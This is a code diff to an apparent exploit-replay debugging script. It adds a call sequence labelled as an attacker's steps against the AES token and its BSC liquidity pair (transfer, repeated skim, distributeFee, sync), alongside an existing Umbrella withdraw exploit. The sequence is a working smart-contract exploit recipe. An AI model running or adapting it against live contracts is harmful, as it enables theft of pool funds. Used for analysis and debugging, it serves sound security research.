@@ -75,4 +75,49 @@ UmbrellaExp = [
     # caller can be arbitrary attacker
     {"caller": "0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e4", "target": "0xB3FB1D01B07A706736Ca175f827e4F56021b85dE", "name": "withdraw", "args": [8792873290680252648282]}
 ]
-generate_debug_file("eth", UmbrellaExp)
+# generate_debug_file("eth", UmbrellaExp)
+
+
+AES = Web3.toChecksumAddress("0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907")
+PAIR = Web3.toChecksumAddress("0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3")
+ATTACKER = Web3.toChecksumAddress("0x790ff2bdc2591af87e656febc6ffdf2d9b2f48e1")
+AESExp = [
+    {
+        "caller": ATTACKER,
+        "target": AES, 
+        "name": "transfer", "args": [PAIR, Web3.toWei(1e5, "ether")]
+    },
+
+    *[
+        {
+            "caller": ATTACKER,
+            "target": PAIR, 
+            "name": "skim", "args": [PAIR]
+        } for _ in range(2)
+    ],
+
+    {
+        "caller": ATTACKER,
+        "target": PAIR, 
+        "name": "skim", "args": [ATTACKER]
+    },
+
+    {
+        "caller": ATTACKER,
+        "target": AES, 
+        "name": "distributeFee", "args": []
+    },
+
+    {
+         "caller":ATTACKER,
+        "target": PAIR, 
+        "name": "sync", "args": []
+    },
+    {
+        "caller": ATTACKER,
+        "target": AES,
+        "name": "balanceOf", "args": [ATTACKER]
+    },
+]
+
+generate_debug_file("bsc", AESExp)
